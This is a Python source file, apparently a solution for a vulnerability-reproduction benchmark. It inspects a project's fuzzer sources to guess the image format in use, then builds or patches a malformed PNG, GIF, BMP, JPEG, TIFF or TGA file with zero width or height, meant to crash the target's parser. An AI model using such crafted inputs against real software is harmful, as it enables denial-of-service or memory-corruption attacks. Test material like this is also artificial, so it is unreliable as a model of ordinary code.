import os
import re
import tarfile
import struct
import tempfile
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Tuple
import zlib


def _is_within_limit(n: int, limit: int) -> bool:
    return 0 <= n <= limit


def _lower_bytes_to_str(b: bytes) -> str:
    try:
        return b.decode("utf-8", "ignore").lower()
    except Exception:
        return b.decode("latin-1", "ignore").lower()


def _chunk_crc(typ: bytes, data: bytes) -> int:
    return zlib.crc32(typ + data) & 0xFFFFFFFF


def _png_chunk(typ: bytes, data: bytes) -> bytes:
    return struct.pack(">I", len(data)) + typ + data + struct.pack(">I", _chunk_crc(typ, data))


def _gen_png_zero_width(width_zero: bool = True) -> bytes:
    sig = b"\x89PNG\r\n\x1a\n"
    w = 0 if width_zero else 1
    h = 1 if width_zero else 0
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 0, 0, 0, 0)  # grayscale, deflate, default
    raw = b"\x00"  # 1 scanline with filter byte only when width=0
    comp = zlib.compress(raw, 9)
    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", comp) + _png_chunk(b"IEND", b"")


def _gen_gif_zero_width() -> bytes:
    # Minimal GIF with global color table and an image descriptor. Width=0 in both LSD and image descriptor.
    header = b"GIF89a"
    lsd = struct.pack("<HHBBB", 0, 1, 0x80, 0, 0)  # w=0,h=1, GCT flag set, size=2 colors
    gct = b"\x00\x00\x00\xff\xff\xff"
    img_desc = b"\x2c" + struct.pack("<HHHHB", 0, 0, 0, 1, 0)  # w=0,h=1
    lzw_min = b"\x02"
    # LZW stream: Clear(4), 0, End(5) with code size 3 => bytes 0x44,0x01
    img_data = b"\x02\x44\x01\x00"
    trailer = b"\x3b"
    return header + lsd + gct + img_desc + lzw_min + img_data + trailer


def _gen_bmp_zero_width() -> bytes:
    # BITMAPINFOHEADER, 24bpp, width=0, height=1
    bfType = b"BM"
    bfOffBits = 14 + 40
    pixel_data = b"\x00\x00\x00\x00"
    bfSize = bfOffBits + len(pixel_data)
    file_hdr = struct.pack("<2sIHHI", bfType, bfSize, 0, 0, bfOffBits)
    dib_hdr = struct.pack("<IIIHHIIIIII",
                          40,          # biSize
                          0,           # biWidth
                          1,           # biHeight
                          1,           # planes
                          24,          # bitcount
                          0,           # compression
                          len(pixel_data),  # size image
                          2835, 2835,  # ppm
                          0, 0)        # colors used/important
    return file_hdr + dib_hdr + pixel_data


def _gen_tga_zero_width() -> bytes:
    # Uncompressed truecolor TGA, width=0 height=1, 24bpp
    header = struct.pack("<BBBHHBHHHHBB",
                         0,  # id length
                         0,  # color map type
                         2,  # image type
                         0, 0, 0,  # cmap spec
                         0, 0,     # x origin
                         0, 0,     # y origin
                         0,        # width
                         1,        # height
                         24,       # pixel depth
                         0)        # image descriptor
    return header + b"\x00\x00\x00"


def _gen_tiff_zero_width() -> bytes:
    # Classic TIFF little-endian with essential tags, ImageWidth=0
    # Tags: 256(W)=0, 257(H)=1, 258(BPS)=8, 259(Comp)=1, 262(Phot)=1,
    # 273(StripOffsets)=data_offset, 277(SamplesPerPixel)=1, 278(RowsPerStrip)=1, 279(StripByteCounts)=1
    endian = b"II"
    magic = struct.pack("<H", 42)
    ifd_offset = struct.pack("<I", 8)

    entries = []

    def add(tag: int, typ: int, count: int, value: int):
        entries.append(struct.pack("<HHII", tag, typ, count, value))

    add(256, 4, 1, 0)   # width LONG
    add(257, 4, 1, 1)   # height LONG
    add(258, 3, 1, 8)   # BitsPerSample SHORT (stored inline)
    add(259, 3, 1, 1)   # Compression SHORT
    add(262, 3, 1, 1)   # PhotometricInterpretation SHORT
    add(277, 3, 1, 1)   # SamplesPerPixel SHORT
    # StripOffsets placeholder, set later
    add(273, 4, 1, 0)
    add(278, 4, 1, 1)   # RowsPerStrip LONG
    add(279, 4, 1, 1)   # StripByteCounts LONG

    n = len(entries)
    ifd = struct.pack("<H", n) + b"".join(entries) + struct.pack("<I", 0)

    data_offset_val = 8 + len(ifd)
    # Patch StripOffsets entry (7th in our list => index 6, tag 273)
    # Each entry is 12 bytes after the 2-byte count
    strip_entry_off = 2 + 12 * 6
    ifd = bytearray(ifd)
    ifd[strip_entry_off + 8:strip_entry_off + 12] = struct.pack("<I", data_offset_val)
    ifd = bytes(ifd)

    img_data = b"\x00"
    return endian + magic + ifd_offset + ifd + img_data


_MINIMAL_JPEG_1X1 = bytes.fromhex(
    "ffd8"
    "ffe000104a46494600010100000100010000"
    "ffdb00430001010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101"
    "ffc0000b080001000101011100"
    "ffc4001400010000000000000000000000000000000000"
    "ffda0008010100003f00"
    "00"
    "ffd9"
)


def _patch_jpeg_set_height0(data: bytes) -> Optional[bytes]:
    if len(data) < 4 or data[0:2] != b"\xff\xd8":
        return None
    b = bytearray(data)
    i = 2
    n = len(b)
    while i + 1 < n:
        if b[i] != 0xFF:
            i += 1
            continue
        j = i
        while j < n and b[j] == 0xFF:
            j += 1
        if j >= n:
            break
        marker = b[j]
        i = j + 1
        if marker == 0xD9 or marker == 0xDA:
            break
        if 0xD0 <= marker <= 0xD7 or marker == 0x01:
            continue
        if i + 2 > n:
            break
        seglen = (b[i] << 8) | b[i + 1]
        if seglen < 2 or i + seglen > n:
            break
        seg_start = i + 2
        if marker in (0xC0, 0xC1, 0xC2, 0xC3, 0xC5, 0xC6, 0xC7, 0xC9, 0xCA, 0xCB, 0xCD, 0xCE, 0xCF):
            if seg_start + 5 <= n:
                # precision at seg_start, height next 2 bytes, width next 2 bytes
                b[seg_start + 1] = 0
                b[seg_start + 2] = 0
                return bytes(b)
        i = i + seglen
    return None


def _gen_jpeg_zero_height() -> bytes:
    patched = _patch_jpeg_set_height0(_MINIMAL_JPEG_1X1)
    if patched is not None:
        return patched
    return _MINIMAL_JPEG_1X1


def _patch_png_set_width0(data: bytes) -> Optional[bytes]:
    if len(data) < 33 or data[0:8] != b"\x89PNG\r\n\x1a\n":
        return None
    off = 8
    if off + 8 > len(data):
        return None
    length = struct.unpack(">I", data[off:off + 4])[0]
    typ = data[off + 4:off + 8]
    if typ != b"IHDR" or length != 13:
        return None
    chunk_data_off = off + 8
    chunk_crc_off = chunk_data_off + length
    if chunk_crc_off + 4 > len(data):
        return None
    ihdr = bytearray(data[chunk_data_off:chunk_data_off + 13])
    ihdr[0:4] = b"\x00\x00\x00\x00"  # width=0
    new_crc = _chunk_crc(b"IHDR", bytes(ihdr))
    out = bytearray(data)
    out[chunk_data_off:chunk_data_off + 13] = ihdr
    out[chunk_crc_off:chunk_crc_off + 4] = struct.pack(">I", new_crc)
    return bytes(out)


def _patch_gif_set_width0(data: bytes) -> Optional[bytes]:
    if len(data) < 10 or data[0:6] not in (b"GIF87a", b"GIF89a"):
        return None
    out = bytearray(data)
    out[6:8] = b"\x00\x00"  # LSD width=0
    # Patch first image descriptor width too if present
    i = 13  # after header+LSD (7 bytes? actually 6+7=13)
    n = len(out)
    # Skip global color table if present
    packed = out[10]
    gct_flag = (packed >> 7) & 1
    gct_size = 2 ** (((packed & 0x07) + 1)) if gct_flag else 0
    i = 13 + 3 * gct_size
    while i < n:
        b0 = out[i]
        if b0 == 0x2C:
            if i + 9 <= n:
                out[i + 5:i + 7] = b"\x00\x00"  # image width=0
            break
        elif b0 == 0x21:
            if i + 2 > n:
                break
            i += 2
            while i < n:
                if i >= n:
                    break
                block_len = out[i]
                i += 1
                if block_len == 0:
                    break
                i += block_len
            continue
        elif b0 == 0x3B:
            break
        else:
            i += 1
    return bytes(out)


def _patch_bmp_set_width0(data: bytes) -> Optional[bytes]:
    if len(data) < 26 or data[0:2] != b"BM":
        return None
    out = bytearray(data)
    # biWidth at offset 18
    out[18:22] = b"\x00\x00\x00\x00"
    return bytes(out)


def _patch_tiff_set_width0(data: bytes) -> Optional[bytes]:
    if len(data) < 8:
        return None
    endian = data[0:2]
    if endian == b"II":
        le = True
    elif endian == b"MM":
        le = False
    else:
        return None

    def u16(off: int) -> int:
        if off + 2 > len(data):
            return 0
        return struct.unpack("<H" if le else ">H", data[off:off + 2])[0]

    def u32(off: int) -> int:
        if off + 4 > len(data):
            return 0
        return struct.unpack("<I" if le else ">I", data[off:off + 4])[0]

    def p16(v: int) -> bytes:
        return struct.pack("<H" if le else ">H", v)

    def p32(v: int) -> bytes:
        return struct.pack("<I" if le else ">I", v)

    magic = u16(2)
    out = bytearray(data)
    if magic == 42:
        ifd_off = u32(4)
        if ifd_off < 8 or ifd_off + 2 > len(out):
            return None
        ne = u16(ifd_off)
        base = ifd_off + 2
        for idx in range(ne):
            eoff = base + 12 * idx
            if eoff + 12 > len(out):
                break
            tag = u16(eoff)
            typ = u16(eoff + 2)
            cnt = u32(eoff + 4)
            valoff = eoff + 8
            if tag == 256 and cnt == 1:
                if typ == 3:  # SHORT
                    out[valoff:valoff + 2] = p16(0)
                    return bytes(out)
                elif typ == 4:  # LONG
                    out[valoff:valoff + 4] = p32(0)
                    return bytes(out)
        return None
    elif magic == 43:
        # BigTIFF
        if len(out) < 16:
            return None
        offsize = u16(4)
        if offsize != 8:
            return None
        if le:
            ifd_off = struct.unpack("<Q", out[8:16])[0]
        else:
            ifd_off = struct.unpack(">Q", out[8:16])[0]
        if ifd_off < 16 or ifd_off + 8 > len(out):
            return None
        if le:
            ne = struct.unpack("<Q", out[ifd_off:ifd_off + 8])[0]
        else:
            ne = struct.unpack(">Q", out[ifd_off:ifd_off + 8])[0]
        base = ifd_off + 8
        for idx in range(int(min(ne, 1_000_000))):
            eoff = base + 20 * idx
            if eoff + 20 > len(out):
                break
            if le:
                tag, typ = struct.unpack("<HH", out[eoff:eoff + 4])
                cnt = struct.unpack("<Q", out[eoff + 4:eoff + 12])[0]
                val = out[eoff + 12:eoff + 20]
            else:
                tag, typ = struct.unpack(">HH", out[eoff:eoff + 4])
                cnt = struct.unpack(">Q", out[eoff + 4:eoff + 12])[0]
                val = out[eoff + 12:eoff + 20]
            if tag == 256 and cnt == 1:
                # If fits in 8 bytes, value stored inline. Set all to zero.
                out[eoff + 12:eoff + 20] = b"\x00" * 8
                return bytes(out)
        return None
    return None


def _format_scores_from_text(txt_lower: str) -> Dict[str, int]:
    scores: Dict[str, int] = {}
    def add(fmt: str, v: int) -> None:
        scores[fmt] = scores.get(fmt, 0) + v

    if "llvmfuzzertestoneinput" in txt_lower:
        add("_has_fuzzer", 1000)

    # TIFF
    if "tiff" in txt_lower:
        add("tiff", 4)
    if "tiffio.h" in txt_lower or "tiffopen" in txt_lower or "tiffclientopen" in txt_lower:
        add("tiff", 8)
    if "tif_" in txt_lower or "tiffread" in txt_lower:
        add("tiff", 2)

    # PNG
    if "png" in txt_lower:
        add("png", 3)
    if "png.h" in txt_lower or "libpng" in txt_lower or "png_create_read_struct" in txt_lower:
        add("png", 8)
    if "ihdr" in txt_lower and "idat" in txt_lower:
        add("png", 3)

    # GIF
    if "gif" in txt_lower:
        add("gif", 3)
    if "gif_lib.h" in txt_lower or "dgifopen" in txt_lower or "egifopen" in txt_lower:
        add("gif", 8)

    # JPEG
    if "jpeg" in txt_lower or "jpg" in txt_lower:
        add("jpeg", 3)
    if "jpeglib.h" in txt_lower or "jpeg_read_header" in txt_lower:
        add("jpeg", 8)

    # BMP
    if "bmp" in txt_lower:
        add("bmp", 3)

    # TGA
    if "tga" in txt_lower:
        add("tga", 3)

    # DDS
    if "dds" in txt_lower:
        add("dds", 3)

    # PSD
    if "psd" in txt_lower:
        add("psd", 3)

    # stb_image generic
    if "stbi_load_from_memory" in txt_lower or "stb_image" in txt_lower:
        add("png", 2)
        add("bmp", 2)
        add("gif", 2)
        add("jpeg", 2)
        add("tga", 2)

    return scores


def _select_best_format(scores: Dict[str, int]) -> str:
    best_fmt = ""
    best_score = -1
    for fmt, sc in scores.items():
        if fmt == "_has_fuzzer":
            continue
        if sc > best_score:
            best_score = sc
            best_fmt = fmt
    return best_fmt or "png"


def _iter_tar_members(tf: tarfile.TarFile) -> Iterable[tarfile.TarInfo]:
    for m in tf.getmembers():
        if not m.isfile():
            continue
        name = m.name
        if not name or name.startswith("/") or ".." in Path(name).parts:
            continue
        yield m


def _looks_like_image_candidate(name: str, fmt: str) -> bool:
    n = name.lower()
    if fmt == "png":
        return n.endswith(".png")
    if fmt == "gif":
        return n.endswith(".gif")
    if fmt == "bmp":
        return n.endswith(".bmp")
    if fmt == "jpeg":
        return n.endswith(".jpg") or n.endswith(".jpeg")
    if fmt == "tiff":
        return n.endswith(".tif") or n.endswith(".tiff")
    if fmt == "tga":
        return n.endswith(".tga")
    if fmt == "dds":
        return n.endswith(".dds")
    if fmt == "psd":
        return n.endswith(".psd")
    return False


def _is_probably_source(name: str) -> bool:
    n = name.lower()
    exts = (
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".m", ".mm", ".rs", ".go", ".java", ".py", ".js", ".ts",
        ".md", ".txt", ".rst", ".cmake", ".bazel", ".gn", ".gni",
        ".mk", ".mak", ".make", ".in", ".ac", ".am", ".sh", ".bat",
        ".yml", ".yaml", ".json", ".toml", ".ini"
    )
    return n.endswith(exts) or "/fuzz" in n or "/fuzzer" in n or "fuzz" in os.path.basename(n)


def _signature_matches(fmt: str, data: bytes) -> bool:
    if fmt == "png":
        return data.startswith(b"\x89PNG\r\n\x1a\n")
    if fmt == "gif":
        return data.startswith(b"GIF87a") or data.startswith(b"GIF89a")
    if fmt == "bmp":
        return data.startswith(b"BM")
    if fmt == "jpeg":
        return data.startswith(b"\xff\xd8")
    if fmt == "tiff":
        return data.startswith(b"II*\x00") or data.startswith(b"MM\x00*") or data.startswith(b"II+\x00") or data.startswith(b"MM\x00+")
    if fmt == "tga":
        # No strong signature; accept by extension only.
        return len(data) >= 18
    if fmt == "dds":
        return data.startswith(b"DDS ")
    if fmt == "psd":
        return data.startswith(b"8BPS")
    return False


def _patch_dimensions(fmt: str, data: bytes) -> Optional[bytes]:
    if fmt == "png":
        return _patch_png_set_width0(data)
    if fmt == "gif":
        return _patch_gif_set_width0(data)
    if fmt == "bmp":
        return _patch_bmp_set_width0(data)
    if fmt == "jpeg":
        return _patch_jpeg_set_height0(data)  # use height=0
    if fmt == "tiff":
        return _patch_tiff_set_width0(data)
    return None


def _gen_minimal(fmt: str) -> bytes:
    if fmt == "png":
        return _gen_png_zero_width(True)
    if fmt == "gif":
        return _gen_gif_zero_width()
    if fmt == "bmp":
        return _gen_bmp_zero_width()
    if fmt == "jpeg":
        return _gen_jpeg_zero_height()
    if fmt == "tiff":
        return _gen_tiff_zero_width()
    if fmt == "tga":
        return _gen_tga_zero_width()
    # fallback
    return _gen_png_zero_width(True)


class Solution:
    def solve(self, src_path: str) -> bytes:
        path = Path(src_path)

        scores: Dict[str, int] = {}
        chosen_fmt: str = "png"
        best_img: Optional[bytes] = None
        best_img_size: int = 1 << 60

        def add_scores(more: Dict[str, int], weight: int = 1) -> None:
            for k, v in more.items():
                scores[k] = scores.get(k, 0) + v * weight

        if path.is_file():
            try:
                with tarfile.open(str(path), "r:*") as tf:
                    # First pass: identify fuzzer sources and accumulate scores
                    total_text_read = 0
                    text_read_limit = 20_000_000
                    fuzz_texts: List[str] = []

                    for m in _iter_tar_members(tf):
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        name = m.name
                        if not _is_probably_source(name):
                            continue
                        if total_text_read >= text_read_limit:
                            break
                        try:
                            f = tf.extractfile(m)
                            if not f:
                                continue
                            data = f.read(min(m.size, 300_000))
                        except Exception:
                            continue
                        total_text_read += len(data)
                        txt = _lower_bytes_to_str(data)
                        sc = _format_scores_from_text(txt)
                        if sc.get("_has_fuzzer"):
                            fuzz_texts.append(txt)
                            add_scores(sc, 3)
                        else:
                            add_scores(sc, 1)

                    # If multiple fuzzers exist with divergent formats, take the best among fuzzer texts
                    if fuzz_texts:
                        local_scores: Dict[str, int] = {}
                        for txt in fuzz_texts:
                            sc = _format_scores_from_text(txt)
                            for k, v in sc.items():
                                if k == "_has_fuzzer":
                                    continue
                                local_scores[k] = local_scores.get(k, 0) + v
                        for k, v in local_scores.items():
                            scores[k] = scores.get(k, 0) + 5 * v

                    chosen_fmt = _select_best_format(scores)

                    # Second pass: find smallest candidate image of chosen format
                    for m in _iter_tar_members(tf):
                        if m.size <= 0 or m.size >= best_img_size or m.size > 2_000_000:
                            continue
                        if not _looks_like_image_candidate(m.name, chosen_fmt):
                            continue
                        try:
                            f = tf.extractfile(m)
                            if not f:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        if not _signature_matches(chosen_fmt, data):
                            continue
                        best_img = data
                        best_img_size = len(data)

            except Exception:
                chosen_fmt = "png"
                best_img = None
        else:
            # Directory fallback
            root = path if path.is_dir() else path.parent
            fuzz_files: List[Path] = []
            for dp, dn, fn in os.walk(root):
                for nm in fn:
                    p = Path(dp) / nm
                    try:
                        st = p.stat()
                    except Exception:
                        continue
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    if _is_probably_source(str(p)):
                        try:
                            data = p.read_bytes()
                        except Exception:
                            continue
                        txt = _lower_bytes_to_str(data[:300_000])
                        sc = _format_scores_from_text(txt)
                        if sc.get("_has_fuzzer"):
                            fuzz_files.append(p)
                            add_scores(sc, 3)
                        else:
                            add_scores(sc, 1)
            chosen_fmt = _select_best_format(scores)

            for dp, dn, fn in os.walk(root):
                for nm in fn:
                    p = Path(dp) / nm
                    if not _looks_like_image_candidate(str(p), chosen_fmt):
                        continue
                    try:
                        st = p.stat()
                    except Exception:
                        continue
                    if st.st_size <= 0 or st.st_size >= best_img_size or st.st_size > 2_000_000:
                        continue
                    try:
                        data = p.read_bytes()
                    except Exception:
                        continue
                    if not _signature_matches(chosen_fmt, data):
                        continue
                    best_img = data
                    best_img_size = len(data)

        if best_img is not None and best_img_size <= 100_000:
            patched = _patch_dimensions(chosen_fmt, best_img)
            if patched is not None:
                return patched

        return _gen_minimal(chosen_fmt)